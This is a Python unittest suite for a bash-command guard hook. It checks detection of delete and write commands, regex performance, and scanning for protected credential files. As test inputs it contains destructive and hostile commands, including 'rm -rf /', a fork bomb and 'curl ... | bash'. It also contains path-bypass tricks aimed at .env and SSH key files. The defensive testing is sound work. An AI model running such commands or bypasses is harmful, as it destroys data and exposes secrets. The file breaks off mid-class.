#!/usr/bin/env python3
"""Comprehensive test suite for Guardian P0 + P1 fixes.

Tests all P0 ship-blocker fixes, P1 improvements, regression tests for
existing functionality, performance tests, and integration scenarios.

Run: python3 -m pytest /home/idnotbe/projects/ops/temp/test_guardian_p0p1_comprehensive.py -v
  or: python3 /home/idnotbe/projects/ops/temp/test_guardian_p0p1_comprehensive.py
"""

import json
import os
import re
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch

# Set up environment before importing guardian
os.environ.setdefault("CLAUDE_PROJECT_DIR", "/tmp/test-project")

# Add guardian scripts to path
sys.path.insert(
    0, "/home/idnotbe/projects/claude-code-guardian/hooks/scripts"
)

from bash_guardian import (
    _is_inside_quotes,
    _stronger_verdict,
    extract_paths,
    extract_redirection_targets,
    glob_to_literals,
    is_delete_command,
    is_write_command,
    scan_protected_paths,
    split_commands,
)

# Constants
GUARDIAN_CONFIG_PATH = (
    "/home/idnotbe/projects/claude-code-guardian/assets/guardian.default.json"
)
BASH_GUARDIAN_PATH = (
    "/home/idnotbe/projects/claude-code-guardian/hooks/scripts/bash_guardian.py"
)


# ============================================================
# Helper: standard config for scan tests
# ============================================================
SCAN_CONFIG = {
    "zeroAccessPaths": [
        ".env",
        ".env.*",
        ".env*.local",
        "*.pem",
        "id_rsa",
        "id_rsa.*",
        "id_ed25519",
        "id_ed25519.*",
        "~/.ssh/**",
    ],
    "bashPathScan": {
        "enabled": True,
        "exactMatchAction": "ask",
        "patternMatchAction": "ask",
    },
}


# ============================================================
# 1. P0 Fix Tests
# ============================================================


class TestP0_1_ReDoS(unittest.TestCase):
    """P0-1: ReDoS in eval pattern fixed."""

    def setUp(self):
        with open(GUARDIAN_CONFIG_PATH) as f:
            config = json.load(f)
        self.eval_pattern = None
        for p in config["bashToolPatterns"]["block"]:
            if "eval" in p["pattern"].lower():
                self.eval_pattern = p["pattern"]
                break
        self.assertIsNotNone(self.eval_pattern, "Could not find eval pattern in config")

    def test_no_redos_20k_chars(self):
        """20k char adversarial input must complete in <1s (was 6.5s before fix)."""
        bad_input = "eval " + "x" * 20000
        start = time.time()
        re.search(self.eval_pattern, bad_input)
        elapsed = time.time() - start
        self.assertLess(elapsed, 1.0, f"ReDoS: took {elapsed:.3f}s (must be <1s)")

    def test_no_redos_40k_chars(self):
        """40k char input also completes quickly."""
        bad_input = "eval " + "a" * 40000
        start = time.time()
        re.search(self.eval_pattern, bad_input)
        elapsed = time.time() - start
        self.assertLess(elapsed, 1.0, f"ReDoS: took {elapsed:.3f}s (must be <1s)")

    def test_eval_double_quoted_rm_matches(self):
        self.assertIsNotNone(re.search(self.eval_pattern, 'eval "rm file"'))

    def test_eval_single_quoted_rm_matches(self):
        self.assertIsNotNone(re.search(self.eval_pattern, "eval 'rm file'"))

    def test_eval_unquoted_rm_matches(self):
        self.assertIsNotNone(re.search(self.eval_pattern, "eval rm file"))

    def test_eval_case_insensitive(self):
        self.assertIsNotNone(re.search(self.eval_pattern, "EVAL rmdir /tmp"))

    def test_eval_shred_matches(self):
        self.assertIsNotNone(re.search(self.eval_pattern, "eval shred file"))

    def test_benign_not_matched(self):
        self.assertIsNone(re.search(self.eval_pattern, "echo hello"))

    def test_eval_without_deletion_not_matched(self):
        self.assertIsNone(re.search(self.eval_pattern, "eval echo hello"))


class TestP0_2_ExactMatchAction(unittest.TestCase):
    """P0-2: exactMatchAction changed from 'deny' to 'ask'."""

    def test_config_has_ask(self):
        with open(GUARDIAN_CONFIG_PATH) as f:
            config = json.load(f)
        action = config["bashPathScan"]["exactMatchAction"]
        self.assertEqual(action, "ask", f"Expected 'ask', got '{action}'")


class TestP0_3_VerdictFailClose(unittest.TestCase):
    """P0-3: Unknown verdict strings fail closed (deny priority)."""

    def test_code_uses_fail_close_priority(self):
        """Verify source code uses _FAIL_CLOSE_PRIORITY, not 0."""
        with open(BASH_GUARDIAN_PATH) as f:
            content = f.read()
        self.assertIn("_FAIL_CLOSE_PRIORITY", content)
        self.assertIn(
            "_FAIL_CLOSE_PRIORITY = max(_VERDICT_PRIORITY.values())", content
        )
        self.assertNotIn(".get(candidate[0], 0)", content)
        self.assertNotIn(".get(current[0], 0)", content)

    def test_unknown_beats_allow(self):
        """Unknown verdict should beat 'allow' (fail closed)."""
        result = _stronger_verdict(("allow", "ok"), ("unknown_garbage", "test"))
        self.assertEqual(result, ("unknown_garbage", "test"))

    def test_unknown_ties_deny(self):
        """Unknown verdict should tie with deny (deny kept as current)."""
        result = _stronger_verdict(("deny", "blocked"), ("unknown_garbage", "test"))
        self.assertEqual(result, ("deny", "blocked"))

    def test_allow_does_not_beat_unknown(self):
        """Allow should not beat an unknown verdict."""
        result = _stronger_verdict(("unknown_garbage", "test"), ("allow", "ok"))
        self.assertEqual(result, ("unknown_garbage", "test"))

    def test_two_unknowns_keeps_current(self):
        """Two unknown verdicts: current kept (equal priority)."""
        result = _stronger_verdict(("bad1", "r1"), ("bad2", "r2"))
        self.assertEqual(result, ("bad1", "r1"))


# ============================================================
# 2. P1 Fix Tests
# ============================================================


class TestP1_1_GitRmDelete(unittest.TestCase):
    """P1-1: git rm detected as delete command."""

    def test_git_rm_file(self):
        self.assertTrue(is_delete_command("git rm CLAUDE.md"))

    def test_git_rm_force(self):
        self.assertTrue(is_delete_command("git rm -f file.txt"))

    def test_git_rm_cached(self):
        self.assertTrue(is_delete_command("git rm --cached file"))

    def test_git_rm_recursive(self):
        self.assertTrue(is_delete_command("git rm -r dir/"))

    def test_git_status_not_delete(self):
        """git status should NOT be detected as delete."""
        self.assertFalse(is_delete_command("git status"))

    def test_git_commit_not_delete(self):
        """git commit should NOT be detected as delete."""
        self.assertFalse(is_delete_command("git commit -m 'remove old files'"))

    def test_git_add_not_delete(self):
        """git add should NOT be detected as delete (regression)."""
        self.assertFalse(is_delete_command("git add file"))

    def test_git_push_not_delete(self):
        self.assertFalse(is_delete_command("git push origin main"))


class TestP1_2_RedirectTruncation(unittest.TestCase):
    """P1-2: Standalone redirect truncation detected as delete."""

    def test_bare_redirect_truncation(self):
        """> CLAUDE.md is truncation/delete."""
        self.assertTrue(is_delete_command("> CLAUDE.md"))

    def test_colon_redirect_truncation(self):
        """: > CLAUDE.md is truncation/delete."""
        self.assertTrue(is_delete_command(": > CLAUDE.md"))

    def test_noclobber_override(self):
        """>| file is truncation even with noclobber."""
        self.assertTrue(is_delete_command(">| CLAUDE.md"))

    def test_leading_whitespace_truncation(self):
        """Leading whitespace should still be detected."""
        self.assertTrue(is_delete_command("  > file.txt"))

    def test_echo_redirect_not_delete(self):
        """echo hello > file is a WRITE, not a delete."""
        self.assertFalse(is_delete_command("echo hello > file"))

    def test_cat_redirect_not_delete(self):
        """cat foo > bar is a write, not a delete."""
        self.assertFalse(is_delete_command("cat foo > bar"))

    def test_append_not_delete(self):
        """>> file.txt is append, NOT delete."""
        self.assertFalse(is_delete_command(">> file.txt"))

    def test_echo_empty_redirect_not_delete(self):
        """echo '' > file has content, not bare truncation."""
        self.assertFalse(is_delete_command("echo '' > file"))


class TestP1_3_GlobBracketExpansion(unittest.TestCase):
    """P1-3: Glob character class [v] triggers expansion in extract_paths."""

    def test_bracket_glob_detected(self):
        """cat .en[v] should trigger glob expansion."""
        # Create a temp directory with .env file
        with tempfile.TemporaryDirectory() as tmpdir:
            env_file = Path(tmpdir) / ".env"
            env_file.touch()
            paths = extract_paths(f"cat .en[v]", Path(tmpdir))
            path_names = [p.name for p in paths]
            self.assertIn(".env", path_names)

    def test_star_glob_still_works(self):
        """*.txt should still work."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "test.txt").touch()
            paths = extract_paths("cat *.txt", Path(tmpdir))
            path_names = [p.name for p in paths]
            self.assertIn("test.txt", path_names)

    def test_question_glob_still_works(self):
        """tes?.txt should still work."""
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "test.txt").touch()
            paths = extract_paths("cat tes?.txt", Path(tmpdir))
            path_names = [p.name for p in paths]
            self.assertIn("test.txt", path_names)


class TestP1_4_MetadataWriteDetection(unittest.TestCase):
    """P1-4: chmod/touch/chown/chgrp detected as write commands."""

    def test_chmod(self):
        self.assertTrue(is_write_command("chmod 777 file"))

    def test_chmod_recursive(self):
        self.assertTrue(is_write_command("chmod -R 755 dir/"))

    def test_touch(self):
        self.assertTrue(is_write_command("touch file"))

    def test_chown(self):
        self.assertTrue(is_write_command("chown user file"))

    def test_chgrp(self):
        self.assertTrue(is_write_command("chgrp staff file"))

    def test_cat_not_write(self):
        """cat should NOT be detected as write (regression)."""
        self.assertFalse(is_write_command("cat file"))

    def test_ls_not_write(self):
        """ls should NOT be detected as write (regression)."""
        self.assertFalse(is_write_command("ls -la"))

    def test_grep_not_write(self):
        """grep should NOT be detected as write."""
        self.assertFalse(is_write_command("grep pattern file"))


class TestP1_5_TildeExpansion(unittest.TestCase):
    """P1-5: Tilde paths expanded correctly."""

    def test_nonexistent_user_no_crash(self):
        """~nonexistentuser12345 should not crash extract_paths."""
        with tempfile.TemporaryDirectory() as tmpdir:
            try:
                paths = extract_paths(
                    "cat ~nonexistentuser12345/file", Path(tmpdir)
                )
                # Should not crash -- paths may or may not be returned
            except Exception as e:
                self.fail(f"extract_paths crashed on unknown user: {e}")

    def test_home_expansion(self):
        """$HOME should be expanded via expandvars."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create a file that would match after expansion
            home = os.path.expanduser("~")
            # We just verify no crash and correct behavior
            try:
                paths = extract_paths("cat $HOME/test", Path(tmpdir))
            except Exception as e:
                self.fail(f"extract_paths crashed on $HOME: {e}")


class TestP1_6_FlagConcatenatedPaths(unittest.TestCase):
    """P1-6: Flag-concatenated paths like -f.env handled."""

    def test_flag_path_extracted(self):
        """grep -f.env should extract .env as a path."""
        with tempfile.TemporaryDirectory() as tmpdir:
            env_file = Path(tmpdir) / ".env"
            env_file.touch()
            paths = extract_paths("grep -f.env password", Path(tmpdir))
            path_names = [p.name for p in paths]
            self.assertIn(".env", path_names)

    def test_short_flag_skipped(self):
        """-r (short flag, len=2) should be skipped normally."""
        with tempfile.TemporaryDirectory() as tmpdir:
            paths = extract_paths("grep -r pattern", Path(tmpdir))
            # -r should not produce any path
            for p in paths:
                self.assertNotEqual(p.name, "r")

    def test_long_flag_skipped(self):
        """--file=pattern should be skipped (long flag)."""
        with tempfile.TemporaryDirectory() as tmpdir:
            paths = extract_paths("grep --file=pattern src/", Path(tmpdir))
            for p in paths:
                self.assertNotEqual(p.name, "file=pattern")


# ============================================================
# 3. Regression Tests (existing functionality)
# ============================================================


class TestSplitCommands(unittest.TestCase):
    """Regression: split_commands basic and edge cases."""

    def test_single_command(self):
        self.assertEqual(split_commands("echo hello"), ["echo hello"])

    def test_semicolon(self):
        self.assertEqual(split_commands("echo a; echo b"), ["echo a", "echo b"])

    def test_and_then(self):
        self.assertEqual(
            split_commands("echo a && echo b"), ["echo a", "echo b"]
        )

    def test_or_else(self):
        self.assertEqual(
            split_commands("echo a || echo b"), ["echo a", "echo b"]
        )

    def test_pipe(self):
        self.assertEqual(
            split_commands("cat file | grep x"), ["cat file", "grep x"]
        )

    def test_background_ampersand(self):
        self.assertEqual(
            split_commands("echo a & echo b"), ["echo a", "echo b"]
        )

    def test_newline(self):
        self.assertEqual(
            split_commands("echo a\necho b"), ["echo a", "echo b"]
        )

    def test_double_quoted_semicolon(self):
        """Semicolon inside double quotes should NOT split."""
        self.assertEqual(split_commands('echo "a;b"'), ['echo "a;b"'])

    def test_single_quoted_semicolon(self):
        """Semicolon inside single quotes should NOT split."""
        self.assertEqual(split_commands("echo 'a;b'"), ["echo 'a;b'"])

    def test_double_quoted_pipe(self):
        self.assertEqual(split_commands('echo "a|b"'), ['echo "a|b"'])

    def test_escaped_semicolon(self):
        """Backslash-escaped semicolon should NOT split."""
        result = split_commands("echo a\\; echo b")
        self.assertEqual(result, ["echo a\\; echo b"])

    def test_backtick(self):
        self.assertEqual(split_commands("echo `date`"), ["echo `date`"])

    def test_command_substitution(self):
        self.assertEqual(
            split_commands("echo $(echo hello)"), ["echo $(echo hello)"]
        )

    def test_process_substitution(self):
        self.assertEqual(
            split_commands("cat <(echo hello)"), ["cat <(echo hello)"]
        )

    def test_three_commands(self):
        self.assertEqual(split_commands("a; b && c"), ["a", "b", "c"])

    def test_empty_between(self):
        self.assertEqual(split_commands("a;; b"), ["a", "b"])

    def test_redirect_ampersand_not_split(self):
        """&> is redirect, not a separator."""
        self.assertEqual(
            split_commands("cmd &> /dev/null"), ["cmd &> /dev/null"]
        )

    def test_stderr_redirect_not_split(self):
        """2>&1 should not split."""
        self.assertEqual(split_commands("cmd 2>&1"), ["cmd 2>&1"])

    def test_fd_redirect_not_split(self):
        """>&2 should not split."""
        self.assertEqual(
            split_commands("echo err >&2"), ["echo err >&2"]
        )


class TestGlobToLiterals(unittest.TestCase):
    """Regression: glob_to_literals conversion."""

    def test_exact_env(self):
        self.assertEqual(glob_to_literals(".env"), [".env"])

    def test_exact_id_rsa(self):
        self.assertEqual(glob_to_literals("id_rsa"), ["id_rsa"])

    def test_exact_id_ed25519(self):
        self.assertEqual(glob_to_literals("id_ed25519"), ["id_ed25519"])

    def test_prefix_env(self):
        self.assertEqual(glob_to_literals(".env.*"), [".env."])

    def test_prefix_id_rsa(self):
        self.assertEqual(glob_to_literals("id_rsa.*"), ["id_rsa."])

    def test_suffix_pem(self):
        self.assertEqual(glob_to_literals("*.pem"), [".pem"])

    def test_suffix_pfx(self):
        self.assertEqual(glob_to_literals("*.pfx"), [".pfx"])

    def test_suffix_p12(self):
        self.assertEqual(glob_to_literals("*.p12"), [".p12"])

    def test_suffix_tfstate(self):
        self.assertEqual(glob_to_literals("*.tfstate"), [".tfstate"])

    def test_suffix_tfstate_backup(self):
        self.assertEqual(
            glob_to_literals("*.tfstate.backup"), [".tfstate.backup"]
        )

    def test_generic_star_env_rejected(self):
        """*.env is too generic, should return []."""
        self.assertEqual(glob_to_literals("*.env"), [])

    def test_generic_star_key_rejected(self):
        self.assertEqual(glob_to_literals("*.key"), [])

    def test_generic_star_log_rejected(self):
        self.assertEqual(glob_to_literals("*.log"), [])

    def test_wildcard_middle_rejected(self):
        self.assertEqual(glob_to_literals("*credentials*.json"), [])

    def test_wildcard_service_account_rejected(self):
        self.assertEqual(glob_to_literals("*serviceAccount*.json"), [])


class TestScanProtectedPaths(unittest.TestCase):
    """Regression: scan_protected_paths Layer 1."""

    def test_exact_env_detected(self):
        v, r = scan_protected_paths("cat .env", SCAN_CONFIG)
        self.assertEqual(v, "ask")

    def test_dotslash_env_detected(self):
        """./.env should also be caught (I-4 fix)."""
        v, r = scan_protected_paths("cat ./.env", SCAN_CONFIG)
        self.assertEqual(v, "ask")

    def test_prefix_pattern_match(self):
        v, r = scan_protected_paths("cat .env.local", SCAN_CONFIG)
        self.assertEqual(v, "ask")

    def test_suffix_pattern_match(self):
        v, r = scan_protected_paths("ls server.pem", SCAN_CONFIG)
        self.assertEqual(v, "ask")

    def test_allow_safe_commands(self):
        v, r = scan_protected_paths("ls -la", SCAN_CONFIG)
        self.assertEqual(v, "allow")

    def test_allow_git_status(self):
        v, r = scan_protected_paths("git status", SCAN_CONFIG)
        self.assertEqual(v, "allow")

    def test_allow_npm_install(self):
        v, r = scan_protected_paths("npm install express", SCAN_CONFIG)
        self.assertEqual(v, "allow")

    def test_brace_expansion_caught(self):
        """Brace expansion {id_rsa,...} should be caught."""
        v, r = scan_protected_paths("cp {id_rsa,backup} dest", SCAN_CONFIG)
        self.assertEqual(v, "ask")

    def test_disabled_allows_all(self):
        disabled = dict(
            SCAN_CONFIG, bashPathScan={"enabled": False}
        )
        v, r = scan_protected_paths("cat .env", disabled)
        self.assertEqual(v, "allow")


class TestIsWriteCommand(unittest.TestCase):
    """Regression: is_write_command detection."""

    def test_sed_i(self):
        self.assertTrue(is_write_command("sed -i 's/x/y/' file"))

    def test_cp(self):
        self.assertTrue(is_write_command("cp source dest"))

    def test_dd(self):
        self.assertTrue(is_write_command("dd if=/dev/zero of=file"))

    def test_rsync(self):
        self.assertTrue(is_write_command("rsync src dest"))

    def test_patch(self):
        self.assertTrue(is_write_command("patch file.txt"))

    def test_colon_truncate(self):
        self.assertTrue(is_write_command(": > file"))

    def test_tee(self):
        self.assertTrue(is_write_command("tee output.txt"))

    def test_redirect(self):
        self.assertTrue(is_write_command("echo x > file"))

    def test_mv(self):
        self.assertTrue(is_write_command("mv src dest"))

    def test_npm_install_not_write(self):
        """npm install should NOT be write (I-2 fix)."""
        self.assertFalse(is_write_command("npm install express"))

    def test_pip_install_not_write(self):
        """pip install should NOT be write."""
        self.assertFalse(is_write_command("pip install requests"))

    def test_ls_not_write(self):
        self.assertFalse(is_write_command("ls -la"))

    def test_cat_not_write(self):
        self.assertFalse(is_write_command("cat file"))

    def test_grep_not_write(self):
        self.assertFalse(is_write_command("grep pattern file"))

    def test_sed_no_i_not_write(self):
        """sed without -i is stream editing, not file write."""
        self.assertFalse(is_write_command("sed 's/x/y/' file"))


class TestIsDeleteCommand(unittest.TestCase):
    """Regression: is_delete_command detection."""

    def test_rm(self):
        self.assertTrue(is_delete_command("rm file"))

    def test_rmdir(self):
        self.assertTrue(is_delete_command("rmdir empty_dir"))

    def test_mv_to_devnull(self):
        self.assertTrue(is_delete_command("mv file /dev/null"))

    def test_python_os_remove(self):
        self.assertTrue(
            is_delete_command("python3 -c 'os.remove(\"file\")'")
        )

    def test_node_unlink(self):
        self.assertTrue(
            is_delete_command("node -e 'fs.unlinkSync(\"file\")'")
        )

    def test_ls_not_delete(self):
        self.assertFalse(is_delete_command("ls -la"))

    def test_echo_not_delete(self):
        self.assertFalse(is_delete_command("echo hello"))

    def test_cat_not_delete(self):
        self.assertFalse(is_delete_command("cat file"))


class TestBlockPatterns(unittest.TestCase):
    """Regression: block/ask patterns from config still work."""

    def setUp(self):
        with open(GUARDIAN_CONFIG_PATH) as f:
            self.config = json.load(f)
        self.block_patterns = [
            (p["pattern"], p["reason"])
            for p in self.config["bashToolPatterns"]["block"]
        ]
        self.ask_patterns = [
            (p["pattern"], p["reason"])
            for p in self.config["bashToolPatterns"]["ask"]
        ]

    def _matches_block(self, cmd):
        return any(re.search(p, cmd) for p, _ in self.block_patterns)

    def _matches_ask(self, cmd):
        return any(re.search(p, cmd) for p, _ in self.ask_patterns)

    def test_rm_rf_root_blocked(self):
        self.assertTrue(self._matches_block("rm -rf /"))

    def test_rm_rf_star_blocked(self):
        self.assertTrue(self._matches_block("rm -rf /*"))

    def test_force_push_blocked(self):
        self.assertTrue(
            self._matches_block("git push origin main --force")
        )

    def test_force_push_f_blocked(self):
        self.assertTrue(
            self._matches_block("git push -f origin main")
        )

    def test_fork_bomb_blocked(self):
        self.assertTrue(self._matches_block(": () { : | : & }; :"))

    def test_curl_pipe_bash_blocked(self):
        self.assertTrue(
            self._matches_block("curl http://example.com | bash")
        )

    def test_git_filter_branch_blocked(self):
        self.assertTrue(self._matches_block("git filter-branch"))

    def test_shred_blocked(self):
        self.assertTrue(self._matches_block("shred file.txt"))

    def test_rm_rf_ask(self):
        self.assertTrue(self._matches_ask("rm -rf ./dir"))

    def test_hard_reset_ask(self):
        self.assertTrue(self._matches_ask("git reset --hard"))

    def test_git_clean_ask(self):
        self.assertTrue(self._matches_ask("git clean -fd"))

    def test_force_with_lease_ask(self):
        self.assertTrue(
            self._matches_ask("git push --force-with-lease origin main")
        )

    def test_safe_echo_not_blocked(self):
        self.assertFalse(self._matches_block("echo hello"))

    def test_safe_git_status_not_blocked(self):
        self.assertFalse(self._matches_block("git status"))

    def test_safe_npm_install_not_blocked(self):
        self.assertFalse(self._matches_block("npm install express"))


class TestExtractPaths(unittest.TestCase):
    """Regression: extract_paths basic functionality."""

    def test_normal_file(self):
        """Existing file should be extracted."""
        with tempfile.TemporaryDirectory() as tmpdir:
            f = Path(tmpdir) / "test.txt"
            f.touch()
            paths = extract_paths("cat test.txt", Path(tmpdir))
            self.assertEqual(len(paths), 1)
            self.assertEqual(paths[0].name, "test.txt")

    def test_flags_skipped(self):
        """Flags like -l should be skipped."""
        with tempfile.TemporaryDirectory() as tmpdir:
            paths = extract_paths("ls -la", Path(tmpdir))
            for p in paths:
                self.assertFalse(p.name.startswith("-"))

    def test_nonexistent_with_allow(self):
        """Non-existent paths included when allow_nonexistent=True."""
        with tempfile.TemporaryDirectory() as tmpdir:
            paths = extract_paths(
                "rm newfile.txt", Path(tmpdir), allow_nonexistent=True
            )
            names = [p.name for p in paths]
            self.assertIn("newfile.txt", names)

    def test_nonexistent_without_allow(self):
        """Non-existent paths excluded when allow_nonexistent=False."""
        with tempfile.TemporaryDirectory() as tmpdir:
            paths = extract_paths("cat nonexistent.txt", Path(tmpdir))
            self.assertEqual(len(paths), 0)


class TestExtractRedirectionTargets(unittest.TestCase):
    """Regression: extract_redirection_targets."""

    def test_simple_redirect(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            targets = extract_redirection_targets(
                "echo hello > output.txt", Path(tmpdir)
            )
            names = [t.name for t in targets]
            self.assertIn("output.txt", names)

    def test_append_redirect(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            targets = extract_redirection_targets(
                "echo hello >> output.txt", Path(tmpdir)
            )
            names = [t.name for t in targets]
            self.assertIn("output.txt", names)

    def test_quoted_redirect_skipped(self):
        """Redirect inside quotes should be skipped."""
        with tempfile.TemporaryDirectory() as tmpdir:
            targets = extract_redirection_targets(
                'echo "x > y" > output.txt', Path(tmpdir)
            )
            # Should find output.txt but not y
            names = [t.name for t in targets]
            self.assertIn("output.txt", names)
            self.assertNotIn("y", names)


class TestIsInsideQuotes(unittest.TestCase):
    """Regression: _is_inside_quotes."""

    def test_outside_quotes(self):
        self.assertFalse(_is_inside_quotes("echo x > file", 7))

    def test_inside_double_quotes(self):
        self.assertTrue(_is_inside_quotes('echo "x > y"', 9))

    def test_inside_single_quotes(self):
        self.assertTrue(_is_inside_quotes("echo 'x > y'", 9))

    def test_after_close_quotes(self):
        self.assertFalse(_is_inside_quotes('echo "x" > file', 9))


class TestVerdictAggregation(unittest.TestCase):
    """Regression: _stronger_verdict."""

    def test_deny_beats_ask(self):
        result = _stronger_verdict(("ask", "r1"), ("deny", "r2"))
        self.assertEqual(result, ("deny", "r2"))

    def test_deny_beats_allow(self):
        result = _stronger_verdict(("allow", ""), ("deny", "r"))
        self.assertEqual(result, ("deny", "r"))

    def test_ask_beats_allow(self):
        result = _stronger_verdict(("allow", ""), ("ask", "r"))
        self.assertEqual(result, ("ask", "r"))

    def test_deny_stays_over_ask(self):
        result = _stronger_verdict(("deny", "r1"), ("ask", "r2"))
        self.assertEqual(result, ("deny", "r1"))

    def test_ask_stays_over_allow(self):
        result = _stronger_verdict(("ask", "r1"), ("allow", ""))
        self.assertEqual(result, ("ask", "r1"))


# ============================================================
# 4. Performance Tests
# ============================================================


class TestPerformance(unittest.TestCase):
    """Performance: ensure no ReDoS or O(n^2) in critical paths."""

    def test_eval_redos_20k(self):
        """Eval pattern with 20k chars must complete in <1s."""
        with open(GUARDIAN_CONFIG_PATH) as f:
            config = json.load(f)
        eval_pattern = None
        for p in config["bashToolPatterns"]["block"]:
            if "eval" in p["pattern"].lower():
                eval_pattern = p["pattern"]
                break
        bad_input = "eval " + "x" * 20000
        start = time.time()
        re.search(eval_pattern, bad_input)
        self.assertLess(time.time() - start, 1.0)

    def test_split_commands_10k(self):
        """split_commands with 10k char command in <1s."""
        cmd = "echo " + "a" * 10000
        start = time.time()
        split_commands(cmd)
        self.assertLess(time.time() - start, 1.0)

    def test_scan_protected_paths_10k(self):
        """scan_protected_paths with 10k char command in <1s."""
        cmd = "echo " + "a" * 10000
        start = time.time()
        scan_protected_paths(cmd, SCAN_CONFIG)
        self.assertLess(time.time() - start, 1.0)

    def test_all_block_patterns_10k(self):
        """All block patterns against 10k input in <2s total."""
        with open(GUARDIAN_CONFIG_PATH) as f:
            config = json.load(f)
        cmd = "eval " + "x" * 10000
        start = time.time()
        for p in config["bashToolPatterns"]["block"]:
            re.search(p["pattern"], cmd)
        self.assertLess(time.time() - start, 2.0)

    def test_all_ask_patterns_10k(self):
        """All ask patterns against 10k input in <2s total."""
        with open(GUARDIAN_CONFIG_PATH) as f:
            config = json.load(f)
        cmd = "rm " + "x" * 10000
        start = time.time()
        for p in config["bashToolPatterns"]["ask"]:
            re.search(p["pattern"], cmd)
        self.assertLess(time.time() - start, 2.0)


# ============================================================
# 5. Integration Scenarios
# ============================================================


class TestIntegrationScenarios(unittest.TestCase):
    """Integration: compound commands and real-world scenarios."""

    def test_safe_then_dangerous_scan(self):
        """echo safe; cat .env -- should detect zeroAccess violation."""
        # The full command contains .env, Layer 1 should catch it
        v, r = scan_protected_paths("echo safe; cat .env", SCAN_CONFIG)
        self.assertIn(v, ["ask", "deny"])

    def test_npm_install_passes_scan(self):
        """npm install express should pass all scan checks."""
        v, r = scan_protected_paths("npm install express", SCAN_CONFIG)
        self.assertEqual(v, "allow")

    def test_git_rm_compound_detected(self):
        """git rm CLAUDE.md && echo done -- git rm detected as delete."""
        cmds = split_commands("git rm CLAUDE.md && echo done")
        self.assertTrue(any(is_delete_command(c) for c in cmds))

    def test_glob_bypass_scan(self):
        """cat .en[v] -- should be caught by glob expansion in extract_paths."""
        with tempfile.TemporaryDirectory() as tmpdir:
            env_file = Path(tmpdir) / ".env"
            env_file.touch()
            paths = extract_paths("cat .en[v]", Path(tmpdir))
            path_names = [p.name for p in paths]
            self.assertIn(".env", path_names)

    def test_chmod_readonly_scenario(self):
        """chmod 777 poetry.lock -- is_write_command should detect write."""
        self.assertTrue(is_write_command("chmod 777 poetry.lock"))

    def test_compound_with_truncation(self):
        """echo ok; > CLAUDE.md -- truncation detected as delete."""
        cmds = split_commands("echo ok; > CLAUDE.md")
        self.assertTrue(any(is_delete_command(c) for c in cmds))

    def test_piped_command_safe(self):
        """cat file | grep pattern -- should not trigger anything."""
        v, r = scan_protected_paths(
            "cat file | grep pattern", SCAN_CONFIG
        )
        self.assertEqual(v, "allow")
        cmds = split_commands("cat file | grep pattern")
        self.assertFalse(any(is_delete_command(c) for c in cmds))
        self.assertFalse(any(is_write_command(c) for c in cmds))


# ============================================================
# 6. Negative Tests (legitimate commands NOT blocked)
# Cross-model validated: Gemini recommended these
# ============================================================


class TestNegativeTests(unittest.TestCase):
    """Verify legitimate commands are NOT falsely flagged."""

    def test_sed_without_i_not_write(self):
        """sed stream edit (no -i) is non-destructive."""
        self.assertFalse(is_write_command("sed 's/foo/bar/g' file.txt"))

    def test_append_not_delete(self):
        """>> (append) is not destructive like > (truncation)."""
        self.assertFalse(is_delete_command("echo data >> file.txt"))

    def test_git_push_force_with_lease_not_blocked(self):
        """--force-with-lease is safer, should be ask not block."""
        with open(GUARDIAN_CONFIG_PATH) as f:
            config = json.load(f)
        block_patterns = [
            p["pattern"] for p in config["bashToolPatterns"]["block"]
        ]
        cmd = "git push --force-with-lease origin main"
        self.assertFalse(
            any(re.search(p, cmd) for p in block_patterns),
            "force-with-lease should NOT be blocked"
        )

    def test_rm_node_modules_not_root_block(self):
        """rm -rf ./node_modules is NOT rm -rf / (root deletion)."""
        with open(GUARDIAN_CONFIG_PATH) as f:
            config = json.load(f)
        block_patterns = [
            p["pattern"] for p in config["bashToolPatterns"]["block"]
        ]
        cmd = "rm -rf ./node_modules"
        # Should not match the "Root or full system deletion" block pattern
        root_pattern = block_patterns[0]  # rm -rf /
        self.assertIsNone(re.search(root_pattern, cmd))

    def test_git_commit_message_env_not_blocked(self):
        """git commit -m 'fix .env' should not be hard-blocked by scan."""
        # With exactMatchAction="ask", this should trigger ask, not deny
        v, r = scan_protected_paths(
            'git commit -m "fix .env"', SCAN_CONFIG
        )
        # It may trigger "ask" because .env appears, but should not be "deny"
        # with our P0-2 fix (exactMatchAction=ask)
        self.assertNotEqual(v, "deny")

    def test_npm_install_not_write_or_delete(self):
        """npm install should not be write or delete."""
        self.assertFalse(is_write_command("npm install express"))
        self.assertFalse(is_delete_command("npm install express"))

    def test_pip_install_not_write_or_delete(self):
        self.assertFalse(is_write_command("pip install requests"))
        self.assertFalse(is_delete_command("pip install requests"))

    def test_cargo_build_not_write_or_delete(self):
        self.assertFalse(is_write_command("cargo build"))
        self.assertFalse(is_delete_command("cargo build"))

    def test_echo_not_delete(self):
        """echo should never be detected as delete."""
        self.assertFalse(is_delete_command("echo hello"))
        self.assertFalse(is_delete_command("echo 'rm -rf /'"))

    def test_cat_not_write_or_delete(self):
        self.assertFalse(is_write_command("cat README.md"))
        self.assertFalse(is_delete_command("cat README.md"))

    def test_git_status_safe(self):
        v, r = scan_protected_paths("git status", SCAN_CONFIG)
        self.assertEqual(v, "allow")
        self.assertFalse(is_write_command("git status"))
        self.assertFalse(is_delete_command("git status"))

    def test_git_log_safe(self):
        self.assertFalse(is_write_command("git log --oneline"))
        self.assertFalse(is_delete_command("git log --oneline"))

    def test_python_run_script_safe(self):
        """Running a python script is not inherently write/delete."""
        self.assertFalse(is_write_command("python3 script.py"))
        # Only specific unlink/remove calls are delete
        self.assertFalse(is_delete_command("python3 script.py"))

    def test_id_rsa_pub_not_exact_match(self):
        """id_rsa.pub should match prefix pattern (ask), not be blocked outright."""
        # id_rsa.pub has prefix "id_rsa." from "id_rsa.*" pattern
        v, r = scan_protected_paths("cat id_rsa.pub", SCAN_CONFIG)
        # Should be ask (prefix pattern match), not deny
        self.assertIn(v, ["ask", "allow"])


# ============================================================
# 7. Edge Cases from Cross-Model Review (Codex)
# ============================================================


class TestEdgeCases(unittest.TestCase):
    """Edge cases identified by cross-model validation."""

    def test_split_nested_subshell(self):
        """Nested $() should not split incorrectly."""
